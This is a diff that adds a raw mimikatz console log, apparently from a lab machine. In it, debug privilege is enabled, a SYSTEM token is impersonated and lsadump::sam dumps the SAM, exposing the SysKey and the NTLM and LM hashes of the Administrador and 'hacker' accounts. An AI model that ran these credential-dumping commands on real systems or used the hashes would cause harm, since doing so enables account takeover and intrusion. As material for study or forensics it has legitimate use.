@@ -1,0 +1,43 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+252	{0;000003e7} 0 D 10775     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Primary
+ -> Impersonated !
+ * Process Token : {0;00032d76} 1 F 1204802   	ROOTED\jose	S-1-5-21-4001629950-4265076451-4074222949-1603	(12g,23p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 1218182   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : SERVER2008
+SysKey : 8d0d2f51a346fc7760dced3cd5248bbd
+Local SID : S-1-5-21-3262525900-4186731943-4120186324
+
+SAMKey : 75692f81e0606a632bf2f564d25dec57
+
+RID  : 000001f4 (500)
+User : Administrador
+  Hash NTLM: 3e45171bc9c91d797d4c561b648ec753
+
+RID  : 000001f5 (501)
+User : Invitado
+
+RID  : 000003f3 (1011)
+User : hacker
+  Hash NTLM: d23fb75c952d953b5ed6ef524a6ca197
+    lm  - 0: bd3ed41d34cb374107c766c26f465dc8
+    ntlm- 0: d23fb75c952d953b5ed6ef524a6ca197
+
+mimikatz(commandline) # exit
+Bye!
